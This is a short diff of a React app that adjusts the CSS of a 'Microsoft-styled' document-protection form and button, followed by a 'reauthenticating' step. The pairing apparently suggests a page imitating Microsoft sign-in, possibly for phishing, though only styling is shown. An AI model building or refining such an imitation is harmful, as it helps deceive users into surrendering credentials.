@@ -517,7 +517,7 @@ function App() {
       );
 
     case 'document-protection':
-      // --- Microsoft-styled, WIRED TO LOGIC ---
+      // --- Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
       return (
         <div style={{
           background: "#f7f9fb",
@@ -577,9 +577,9 @@ function App() {
               text-align: center;
             }
             .form-group {
-              width: 200%;
-              max-width: 1000px;
-              margin-left: -50%;
+              width: 100%;
+              max-width: 100%;
+              margin-left: 0;
               display: flex;
               flex-direction: column;
               align-items: flex-start;
@@ -645,6 +645,7 @@ function App() {
               margin-top: 6px;
               box-shadow: 0 2px 8px rgba(0,120,212,0.08);
               transition: background 0.18s;
+              display: block;
             }
             .next-btn:hover, .next-btn:focus {
               background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
@@ -752,7 +753,7 @@ function App() {
           </div>
         </div>
       );
-      // --- END Microsoft-styled, WIRED TO LOGIC ---
+      // --- END Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
 
     case 'reauthenticating':
       return (
